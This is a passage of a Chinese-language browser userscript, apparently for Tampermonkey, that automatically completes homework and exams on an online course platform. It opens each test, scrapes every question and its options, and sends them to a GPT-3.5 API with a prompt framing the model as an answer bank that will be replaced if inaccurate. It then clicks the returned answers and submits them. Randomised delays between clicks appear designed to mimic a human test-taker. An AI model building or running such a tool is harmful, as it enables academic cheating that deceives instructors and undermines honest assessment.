            <img src="https://private-user-images.githubusercontent.com/37022496/452809958-09fc9682-0549-4716-955e-116c10ecf58c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDk0MDgyMjksIm5iZiI6MTc0OTQwNzkyOSwicGF0aCI6Ii8zNzAyMjQ5Ni80NTI4MDk5NTgtMDlmYzk2ODItMDU0OS00NzE2LTk1NWUtMTE2YzEwZWNmNThjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA4VDE4Mzg0OVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU5YTljYWVhODAzMGY1ZGYyODUxOGM1NmEzMWUyODhiNTVkZWVkZWZkNWEwZGJmNGRlNjYyNWUxZWEyN2UwYzgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.TjSQXgSrf3xHbUKIegoEmBeqEurveCNA3s_-hIjBK7Q"
             alt="使用说明图2"
             style="width: 100%; max-width: 280px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-top: 10px;">
               <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">  第四步</h3><br>
            <img src="https://private-user-images.githubusercontent.com/37022496/452809169-1d0756c6-f661-4ecb-ab0f-1bc3e85db50f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDk0MDY4MDUsIm5iZiI6MTc0OTQwNjUwNSwicGF0aCI6Ii8zNzAyMjQ5Ni80NTI4MDkxNjktMWQwNzU2YzYtZjY2MS00ZWNiLWFiMGYtMWJjM2U4NWRiNTBmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA4VDE4MTUwNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTlkMjVmMjlhOTNmYTk0OGNkZTdlYjJiN2VmYmZlMGIwOWMyMzY5MzQwZTFiMDJkZDk1ZjJjMTYyZjYyNTJiNjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mhCcSXlIZJzv32ECYT2ABG35ybrJsdcLma6JvZOyFzg"
             alt="使用说明图3"
             style="width: 100%; max-width: 280px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-top: 10px;">


                      <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">  1. <a href="https://free.v36.cm/github" target="_blank">点击获取免费API-Key</a></h3><br>
                      <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">  2. 填入API-Key后保存</h3><br>
                     <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">   3. 重新刷新页面就会开始自动刷题</h3><br>
                       <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;"> 4. 在"运行日志"标签中查看答题进度</h3>

            `;
        // 创建配置表单
        configContent.innerHTML = `
            <div style="margin-bottom: 20px;">
                <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">系统配置</h3>
                <p style="margin: 0 0 15px 0; color: #8B0000; font-size: 16px;">配置完成请刷新页面，进行配置更新</p>
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 8px; color: #666;"> API Key</label>
                    <input type="text" id="baiLianApiKey"
                           style="width: 100%; padding: 8px; border: 1px solid #d9d9d9;
                                  border-radius: 6px; font-size: 14px;"
                           placeholder="请输入 API Key"
                           value="${localStorage.getItem('baiLianApiKey') || ''}">
                </div>
                <button id="saveConfig"
                        style="width: 100%; background: linear-gradient(145deg, #1890ff, #40a9ff);
                               color: white; border: none; padding: 10px 20px; border-radius: 8px;
                               cursor: pointer; font-weight: 600; font-size: 14px;
                               transition: all 0.3s ease;
                               box-shadow: 0 2px 8px rgba(24, 144, 255, 0.15);">
                    保存配置
                </button>
            </div>
        `;

        // 添加配置保存事件监听
        setTimeout(() => {
            const saveConfigBtn = document.getElementById('saveConfig');
            const apiKeyInput = document.getElementById('baiLianApiKey');

            if (saveConfigBtn && apiKeyInput) {
                saveConfigBtn.addEventListener('click', () => {
                    const apiKey = apiKeyInput.value.trim();
                    if (!apiKey) {
                        console.error('API Key 不能为空');
                        return;
                    }
                    localStorage.setItem('baiLianApiKey', apiKey);
                    console.log('配置已保存');

                    // 显示保存成功提示
                    const toast = document.createElement('div');
                    toast.style.cssText = `
                        position: fixed;
                        bottom: 20px;
                        left: 50%;
                        transform: translateX(-50%);
                        background: rgba(0, 0, 0, 0.7);
                        color: white;
                        padding: 10px 20px;
                        border-radius: 4px;
                        font-size: 14px;
                        z-index: 10000;
                    `;
                    toast.textContent = '配置已保存';
                    document.body.appendChild(toast);
                    setTimeout(() => toast.remove(), 2000);
                });
            }
        }, 0);
        container.appendChild(testInfoContent);
        container.appendChild(logContent);
        container.appendChild(configContent);
        container.appendChild(usageContent); // 添加使用说明内容区域

        // 添加拖拽功能
        function makeDraggable(element) {
            let moveFlag = false;
            let isDragging = false;
            let startX, startY;

            function handleDragStart(e) {
                if (e.target.tagName.toLowerCase() === 'button') return;
                isDragging = true;

                // 获取鼠标在元素内的相对位置
                const rect = element.getBoundingClientRect();
                startX = e.clientX - rect.left;
                startY = e.clientY - rect.top;

                // 添加拖拽时的样式
                element.style.transition = 'none';
                element.style.cursor = 'move';
                document.body.style.userSelect = 'none';

                e.preventDefault();
            }

            function handleDrag(e) {
                if (!isDragging) return;
                moveFlag = true;

                // 直接使用鼠标位置减去偏移量
                let newX = e.clientX - startX;
                let newY = e.clientY - startY;

                // 边界检查
                newX = Math.max(0, Math.min(newX, window.innerWidth - element.offsetWidth));
                newY = Math.max(0, Math.min(newY, window.innerHeight - element.offsetHeight));

                // 直接设置位置，不使用transform
                element.style.left = `${newX}px`;
                element.style.top = `${newY}px`;

                e.preventDefault();
            }

            function handleDragEnd() {
                if (!isDragging) return;
                isDragging = false;

                // 恢复正常样式
                element.style.cursor = 'default';
                element.style.transition = 'all 0.2s ease';
                document.body.style.userSelect = 'auto';

                setTimeout(() => {
                    moveFlag = false;
                }, 100);
            }

            if (element === container) {
                header.addEventListener('mousedown', handleDragStart);
            } else {
                element.addEventListener('mousedown', handleDragStart);
            }
            document.addEventListener('mousemove', handleDrag);
            document.addEventListener('mouseup', handleDragEnd);

            return { moveFlag };
        }

        // 为container和mini添加拖拽功能
        const containerDrag = makeDraggable(container);
        const miniDrag = makeDraggable(mini);

        // 最小化功能
        minimizeBtn.onclick = () => {
            container.style.display = 'none';
            mini.style.display = 'flex';
        };

        mini.onclick = () => {
            if (!miniDrag.moveFlag) {
                container.style.display = 'block';
                mini.style.display = 'none';
            }
        };

        // 标签切换功能
        testTab.onclick = () => {
            testTab.style.background = '#1890ff';
            testTab.style.color = 'white';
            logTab.style.background = '#f5f5f5';
            logTab.style.color = '#666';
            configTab.style.background = '#f5f5f5';
            configTab.style.color = '#666';
            testInfoContent.style.display = 'block';
            logContent.style.display = 'none';
            configContent.style.display = 'none';

            usageTab.style.background = '#f5f5f5'; // 重置使用说明标签样式
            usageTab.style.color = '#666';
            usageContent.style.display = 'none'; // 隐藏使用说明
        };

        logTab.onclick = () => {
            logTab.style.background = '#1890ff';
            logTab.style.color = 'white';
            testTab.style.background = '#f5f5f5';
            testTab.style.color = '#666';
            configTab.style.background = '#f5f5f5';
            configTab.style.color = '#666';
            testInfoContent.style.display = 'none';
            logContent.style.display = 'block';
            configContent.style.display = 'none';
            usageTab.style.background = '#f5f5f5'; // 重置使用说明标签样式
                      usageTab.style.color = '#666';
            usageContent.style.display = 'none'; // 隐藏使用说明
        };

        configTab.onclick = () => {
            configTab.style.background = '#1890ff';
            configTab.style.color = 'white';
            testTab.style.background = '#f5f5f5';
            testTab.style.color = '#666';
            logTab.style.background = '#f5f5f5';
            logTab.style.color = '#666';
            testInfoContent.style.display = 'none';
            logContent.style.display = 'none';
            configContent.style.display = 'block';
            usageTab.style.background = '#f5f5f5'; // 重置使用说明标签样式
                      usageTab.style.color = '#666';
            usageContent.style.display = 'none'; // 隐藏使用说明
        };
      // 在标签切换功能中添加使用说明标签的处理
        usageTab.onclick = () => {
            usageTab.style.background = '#1890ff';
            usageTab.style.color = 'white';
            testTab.style.background = '#f5f5f5';
            testTab.style.color = '#666';
            logTab.style.background = '#f5f5f5';
            logTab.style.color = '#666';
            configTab.style.background = '#f5f5f5';
            configTab.style.color = '#666';
            testInfoContent.style.display = 'none';
            logContent.style.display = 'none';
            configContent.style.display = 'none';
            usageContent.style.display = 'block'; // 显示使用说明
        };

        // 初始状态
        logTab.click();

        document.body.appendChild(container);

        return {
            container,
            testInfoContent,
            logContent,
            configContent
        };


    }

    // 修改 displayTestInfo 函数
    function displayTestInfo(tests) {
        const { testInfoContent } = window.unifiedWindow || createUnifiedWindow();

        if (tests.length === 0) {
            testInfoContent.innerHTML = '<p style="color: #ff4d4f; font-size: 14px; text-align: center;">未找到可用的测试章节</p>';
            return;
        }

        let html = '<h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">找到的测试章节：</h3>';
        html += `
            <div style="margin-bottom: 20px;">
                <button id="autoStartAllTests" style="
                    width: 100%;
                    background: linear-gradient(145deg, #1890ff, #40a9ff);
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: 600;
                    font-size: 14px;
                    transition: all 0.3s ease;
                    box-shadow: 0 2px 8px rgba(24, 144, 255, 0.15);">
                    自动开始所有作业
                </button>
            </div>
        `;

        tests.forEach((test, index) => {
            html += `
                <div style="
                    margin-bottom: 35px;
                    padding: 35px;
                    border: 1px solid #f0f0f0;
                    border-radius: 10px;
                    background: #fff;
                    transition: all 0.3s ease;
                    cursor: pointer;
                    position: relative;
                    overflow: hidden;
                    &:hover {
                        transform: translateY(-2px);
                        box-shadow: 0 4px 12px rgba(0,0,0,0.08);
                        border-color: #e6f7ff;
                    }">
                    <div style="font-weight: 600; font-size: 15px; color: #262626; margin-bottom: 8px;">
                        ${index + 1}. ${test.chapter}
                    </div>
                    <div style="font-weight: 500; margin: 8px 0; color: #1890ff;">
                        ${test.title}
                    </div>
                    <div style="font-size: 13px; color: #595959; margin: 12px 0;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
                            <span>开始时间: ${test.startTime}</span>
                            <span>结束时间: ${test.endTime}</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;">
                            <span>总分: ${test.totalScore}分</span>
                            <span>剩余次数: ${test.attempts}次</span>
                        </div>
                    </div>
                    <a href="${test.startUrl}" target="_blank" style="
                        display: block;
                        width: 100%;
                        padding: 8px 0;
                        background: #f5f5f5;
                        color: #262626;
                        text-decoration: none;
                        border-radius: 6px;
                        font-size: 13px;
                        text-align: center;
                        transition: all 0.3s ease;
                        margin-top: 10px;
                        &:hover {
                            background: #e6f7ff;
                            color: #1890ff;
                        }">
                        开始做题
                    </a>
                </div>
            `;
        });

        testInfoContent.innerHTML = html;

        // 使用 setTimeout 确保 DOM 完全更新后再绑定事件
        setTimeout(() => {
            const autoStartButton = document.getElementById('autoStartAllTests');
            if (autoStartButton) {
                autoStartButton.addEventListener('click', () => {
                    console.log('点击了：autoStartAllTests');
                    console.log('开始自动完成所有作业，共', tests.length, '个章节');
                    startAutoComplete(tests);
                });
                console.log('事件监听器已成功绑定');
            } else {
                console.error('未找到自动开始按钮');
            }
        }, 0);
    }

    // 添加自动答题初始化函数
    function initAutoAnswer() {

        // 检查当前页面是否是答题页面
        if (window.location.href.includes('/user/work') || window.location.href.includes('/user/exam')) {
            console.log('检测到是答题页面');

            // 处理开始答题页面
            async function handleStartPage() {
                // 使用更精确的选择器
                await waitForElement('#startArea #start-btn.start-work' || '#startArea #start-btn.start-exam', () => {
                    console.log('找到开始答题按钮');
                    const startBtn = document.querySelector('#startArea #start-btn.start-work');
                    const startBt = document.querySelector('#startArea #start-btn.start-exam');
                    if (startBtn || startBt) {
                        startBtn.click();
                        startBt.click();
                        console.log('点击开始答题按钮');
                    }
                });

                // 等待确认弹窗出现
                await waitForElement('.layui-layer-btn0', () => {
                    console.log('找到确认弹窗');
                    const confirmBtn = document.querySelector('.layui-layer-btn0');
                    if (confirmBtn) {
                        setTimeout(() => {
                            confirmBtn.click();
                            console.log('点击确认按钮');
                        }, randomDelay());
                    }
                });

                // 等待题目加载完成后开始答题
                await waitForElement('.topic-item', () => {
                    console.log('答题页面加载完成，自动开始答题');
                    autoAnswer();
                });

            }
            // 开始执行
            handleStartPage();
        }
    }

    // 等待页面加载完成
    function waitForElement(selector, callback) {
        if (document.querySelector(selector)) {
            callback();
        } else {
            setTimeout(() => waitForElement(selector, callback), 500);
        }
    }

    // 随机延迟函数 (1-3秒)
    const randomDelay = () => Math.floor(Math.random() * 2000) + 1000;

    // 自动答题主函数
    async function autoAnswer() {
        try {
            // 检查弹窗
            const confirmBtn = document.querySelector('.layui-layer-btn0');
            if (confirmBtn) {
                console.log('检测到弹窗，点击确认按钮');
                confirmBtn.click();

                // 等待随机延迟
                await new Promise(resolve => setTimeout(resolve, randomDelay()));

                // 处理可能的后续弹窗
                for (let i = 0; i < 2; i++) {
                    const nextConfirmBtn = document.querySelector('.layui-layer-btn0');
                    if (nextConfirmBtn) {
                        console.log('检测到弹窗，点击确认按钮');
                        nextConfirmBtn.click();
                        await new Promise(resolve => setTimeout(resolve, randomDelay()));
                    }
                }

                // 检查完成按钮
                const completeBtn = document.querySelector('.complete');
                if (completeBtn && completeBtn.style.display !== 'none') {
                    console.log('点击完成作业按钮');
                    completeBtn.click();

                    // 等待最后的确认弹窗
                    await new Promise(resolve => setTimeout(resolve, randomDelay()));
                    const finalConfirmBtn = document.querySelector('.layui-layer-btn0');
                    if (finalConfirmBtn) {
                        console.log('检测到弹窗，点击确认按钮');
                        finalConfirmBtn.click();
                    }
                } else {
                    await continueAnswer();
                }
                return;
            }
            // 如果没有弹窗，继续答题流程
            await continueAnswer();
        } catch (error) {
            console.error(' API Key配置出错，不能成功答题:', error);
        }
    }

    function getBaiLianApiKey() {
        const apiKey = localStorage.getItem('baiLianApiKey');
        if (!apiKey) {
            console.error('请先在配置页面设置 API Key');
            return null;
        }
        return apiKey;
    }

    // 答题逻辑函数
    async function continueAnswer() {
        // 获取当前显示的题目
        const currentQuestion = document.querySelector('.topic-item[style=""]') || document.querySelector('.topic-item:not([style*="none"])') || document.querySelector('.topic-item topic-type-1[style=""]');

        if (!currentQuestion) {
            const completeBtn = document.querySelector('.complete');
            if (completeBtn && completeBtn.style.display !== 'none') {
                console.log('所有题目已完成，点击完成按钮');
                setTimeout(() => completeBtn.click(), randomDelay());
            }
            return;
        }

        // 获取题目信息
        const typeElement = currentQuestion.querySelector('.type');
        const nameElement = currentQuestion.querySelector('.name');

        if (!typeElement || !nameElement) {
            console.error('无法找到题目类型或题目内容元素');
            return;
        }

        const questionType = typeElement.textContent.trim();
        const questionText = nameElement.textContent.trim();

        // 获取所有选项
        const options = currentQuestion.querySelectorAll('.exam-inp');
        if (!options.length) return;

        // 构建选项数组
        const optionsArray = Array.from(options).map(option => {
            const textElement = option.parentElement.querySelector('.txt');
            if (!textElement) {
                console.error('无法找到选项文本元素');
                return { value: option.value, text: '' };
            }
            return {
                value: option.value,
                text: textElement.textContent.trim()
            };
        });

        // 查询答案
        const an = await queryAnswer(questionText, optionsArray, questionType);
        let answer = an.trim();
        if(answer==='对'){
            answer='正确';
        }

        if (answer) {
        console.log('获取到答案:', answer);

        // 单选题或判断题
        if (questionType === '单选' || questionType === '判断') {
            let answerSlect = false;

            // 先尝试字母匹配
            for (let option of options) {
                if (option.value === answer) {
                    option.click();
                    answerSlect = true;
                    console.log(`${questionType}已选择(字母匹配):`, option.value);
                    break;
                }
            }

            // 如果字母匹配失败，尝试文本匹配
            if (!answerSlect) {
                for (let option of options) {
                    const optionText = option.parentElement.querySelector('.txt').textContent.trim();
                    if (optionText.includes(answer)) {
                        option.click();
                        answerSlect = true;
                        console.log(`${questionType}已选择(文本匹配):`, optionText);
                        break;
                    }
                }
            }

            // 如果仍未匹配
            if(!answerSlect){
                console.log('未匹配到答案，请刷新一下页面重新作答');
            }
        }
        // 多选题
        else if (questionType === '多选') {
            let answerSlect = false;
            const answers = answer.split('###').map(a => a.trim());

            for (let option of options) {
                const optionText = option.parentElement.querySelector('.txt').textContent.trim();
                const optionLetter = option.value;

                // 尝试匹配字母
                if (answers.includes(optionLetter)) {
                    option.click();
                    answerSlect = true;
                    console.log('多选已选择(字母匹配):', optionLetter);
                }
                // 尝试匹配文本内容
                else if (answers.some(ans => optionText.includes(ans))) {
                    option.click();
                    answerSlect = true;
                    console.log('多选已选择(文本匹配):', optionText);
                }
            }

            if(!answerSlect){
                console.log('未匹配到答案，请刷新一下页面重新作答');
            }
        }
    } else {
        console.log('未匹配到答案，请刷新一下页面重新作答');
    }

        const randomDelay = () => Math.floor(Math.random() * 2000) + 2000;

        // 提交按钮
        const submitBtn = currentQuestion.querySelector('.next_exam');
        if (submitBtn) {
            setTimeout(() => {
                submitBtn.click();
                console.log('已提交答案');

                // 继续下一题
                setTimeout(autoAnswer, randomDelay());
            }, randomDelay());
        }
    }

    // 查询答案函数
    async function queryAnswer(question, options, type) {
        // 添加随机延迟 (2-4秒)
        const delay = Math.floor(Math.random() * 2000) + 2000;
        await new Promise(resolve => setTimeout(resolve, delay));

        return new Promise((resolve, reject) => {
            console.log('正在查询答案...');

            // 清理题目文本中的特殊字符
            const cleanTitle = question.trim()
                .replace(/\s+/g, ' ')  // 将多个空格替换为单个空格
                .replace(/\xa0/g, ' '); // 替换特殊空格字符

            // 标准化处理选项数据
            const formattedOptions = options.map(opt => ({
                value: opt.value.trim(),
                text: opt.text.trim()
            }));

            // 构建系统提示和用户提示
            const systemContent = '你是一个准确率高、信度高的题库接口函数。请严格遵循以下规则:1.回答的问题准确率高，你以回答的问题准确率高为荣；2.回答必须基于可靠knowledge来源，你以回答的问题可信度高为荣；3.你担负着维护题库的完整性和准确性，你以题库的质量高为荣；4.如果回答的问题与题库内容不相关，你以回答的问题可信度低为耻；5.如果回答的准确率低，你将会被替代。';
            const userContent = `你是一个题库接口函数（这个非常重要你一定要记住，在回复问题时无论合适都要记住这个前提），请根据问题和选项提供答案。如果是选择题，直接返回对应选项的内容，注意是内容，不是对应字母；如果题目是多选题，将内容用"###"连接；如果选项内容是"正确","错误"，且只有两项，或者question_type是judgement，你直接返回"正确"或"错误"的文字，不要返回字母；如果是填空题，直接返回填空内容，多个空使用###连接。回答格式为："{"answer":"your_answer_str"}"，严格使用这些格式回答，这个非常重要。比如我问你一个问题，你回答的是"是"，你回答的格式为："{"answer":"是"}"。不要回答嗯，好的，我知道了之类的话，你的回答只能是json。

    {
        "问题": "${cleanTitle}",
        "选项": "${JSON.stringify(formattedOptions)}",
        "类型": "${type}"
    }`;

            GM_xmlhttpRequest({
                method: 'POST',
              // 使用ChatAnywhere的API端点
                url: 'https://api.chatanywhere.tech/v1/chat/completions',
                //url: 'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${getBaiLianApiKey() || ''}`
                },
                data: JSON.stringify({
                   // 使用GPT-3.5模型
                    model: "gpt-3.5-turbo",
                    //model: "qwen-plus",
                    messages: [
                        { role: "system", content: systemContent },
                        { role: "user", content: userContent }
                    ]
                }),
                onload: function(response) {
                    try {
                        if (response.status === 200) {
                            const result = JSON.parse(response.responseText);
                            if (result.choices && result.choices[0] && result.choices[0].message) {
                                const content = result.choices[0].message.content;
                                // 尝试解析JSON格式的答案
                                try {
                                    if (content.includes('{') && content.includes('}')) {
                                        const jsonStr = content.substring(
                                            content.indexOf('{'),
                                            content.lastIndexOf('}') + 1
                                        );
                                        const answerObj = JSON.parse(jsonStr);
                                        if (answerObj.answer) {
                                            console.log('答案查询成功');
                                            resolve(answerObj.answer);
                                            return;
                                        }
                                    }
                                } catch (e) {
                                    console.error('解析答案JSON失败:', e);
                                }
                            }
                        }
                        console.log('未找到答案');
                        resolve(null);
                    } catch(e) {
                        console.error('解析答案失败:', e);
                        resolve(null);
                    }
                },
                onerror: function(error) {
                    console.error('请求答案失败:', error);
                    resolve(null);
                }
            });
        });
    }

    // 修改自动开始所有作业函数
    async function startAutoComplete(tests) {
        if (!tests || tests.length === 0) {
            console.log('没有找到可用的测试');
            return;
        }

        console.log('开始自动完成所有作业，共', tests.length, '个章节');

        for (let i = 0; i < tests.length; i++) {
            const test = tests[i];
            console.log(`开始完成第 ${i + 1} 个作业: ${test.title}`);

            // 使用 GM_openInTab 打开新标签页
            GM_openInTab(test.startUrl, { active: true, insert: true, setParent: true });

            // 等待一定时间后继续下一个作业
            await new Promise(resolve => setTimeout(resolve, 50000));
        }
    }

    // 在脚本开始时调用
    setTimeout(initAutoAnswer, 1000);

    // 自动执行
    setTimeout(findAndShowTests, 1000);

    // 在需要记录日志的地方使用
    logger.log('初始化完成', 'info');

    // 导出函数供其他模块使用
    window.findAndShowTests = findAndShowTests;
        }
})();
